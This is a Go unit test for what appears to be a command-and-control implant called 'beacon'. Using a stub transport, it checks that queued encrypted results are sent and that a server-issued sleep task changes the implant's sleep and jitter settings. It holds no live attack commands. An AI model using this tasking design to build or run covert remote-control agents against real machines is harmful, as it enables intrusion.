package core

import (
	"beacon/pkg/command"
	"beacon/pkg/profile"
	"beacon/pkg/utils/crypt"
	"beacon/pkg/utils/packet"
	"bytes"
	"testing"
	"time"
)

type stubTransport struct {
	calls    int
	metadata [][]byte
	payloads [][]byte
	reply    []byte
}

func (s *stubTransport) Exchange(metadata []byte, payload []byte) ([]byte, error) {
	s.calls++
	s.metadata = append(s.metadata, append([]byte(nil), metadata...))
	s.payloads = append(s.payloads, append([]byte(nil), payload...))
	return s.reply, nil
}

func parseFinalPacketCoreTest(t *testing.T, pkt []byte) (uint32, uint32, []byte) {
	t.Helper()

	outer := packet.CreateParser(pkt)
	body := outer.ParseBytes()
	if outer.HasError() {
		t.Fatalf("parse outer final packet: %v", outer.Error())
	}

	inner := packet.CreateParser(body)
	taskID := inner.ParseInt32()
	commandID := inner.ParseInt32()
	payload := inner.ParseBytes()
	if inner.HasError() {
		t.Fatalf("parse inner final packet: %v", inner.Error())
	}
	return taskID, commandID, payload
}

func TestFlushOutboxDispatchesTasksFromExchangeResponse(t *testing.T) {
	originalProfile := profile.GlobalProfile
	defer func() {
		profile.GlobalProfile = originalProfile
	}()

	ctx := &Context{
		SessionKey: bytes.Repeat([]byte{0x41}, sessionKeySize),
	}
	ctx.Outbox.Init()

	handler := command.NewHandler(0)
	defer handler.Close()

	heartbeat := []byte("heartbeat-envelope")
	initialResult := packet.MakeFinalPacket(99, command.CommandWhoami, []byte("first-result"))
	ctx.Outbox.Enqueue(initialResult)

	sleepPayload, err := packet.PackArray([]any{
		int32(2),
		int32(2500),
		int32(33),
	})
	if err != nil {
		t.Fatalf("pack sleep payload: %v", err)
	}
	taskBlock, err := packet.PackArray([]any{
		int32(7),
		int32(command.CommandSleep),
		packet.PackBytes(sleepPayload),
	})
	if err != nil {
		t.Fatalf("pack task block: %v", err)
	}
	encryptedReply, err := crypt.EncryptTask(ctx.SessionKey, packet.PackBytes(taskBlock))
	if err != nil {
		t.Fatalf("encrypt task reply: %v", err)
	}

	transport := &stubTransport{reply: encryptedReply}
	agent := &Agent{
		Ctx:     ctx,
		client:  transport,
		handler: handler,
	}

	agent.flushOutbox(heartbeat)

	if transport.calls != 1 {
		t.Fatalf("exchange calls = %d, want 1", transport.calls)
	}
	if !bytes.Equal(transport.metadata[0], heartbeat) {
		t.Fatalf("metadata = %q, want %q", transport.metadata[0], heartbeat)
	}

	sentPlain, err := crypt.DecryptResult(ctx.SessionKey, transport.payloads[0])
	if err != nil {
		t.Fatalf("decrypt sent result: %v", err)
	}
	if !bytes.Equal(sentPlain, initialResult) {
		t.Fatalf("sent result mismatch")
	}

	if profile.GlobalProfile.SleepTime != 2500*time.Millisecond {
		t.Fatalf("sleep time = %v, want 2500ms", profile.GlobalProfile.SleepTime)
	}
	if profile.GlobalProfile.Jitter != 33 {
		t.Fatalf("jitter = %d, want 33", profile.GlobalProfile.Jitter)
	}

	pending := ctx.Outbox.Drain()
	if pending == nil || pending.next != nil {
		t.Fatalf("pending results count mismatch")
	}

	taskID, commandID, payload := parseFinalPacketCoreTest(t, pending.packet)
	if taskID != 7 || commandID != command.CommandSleep {
		t.Fatalf("final packet = task %d command %d, want task 7 command %d", taskID, commandID, command.CommandSleep)
	}
	if string(payload) != "Sleep policy updated" {
		t.Fatalf("payload = %q, want sleep update message", string(payload))
	}
}
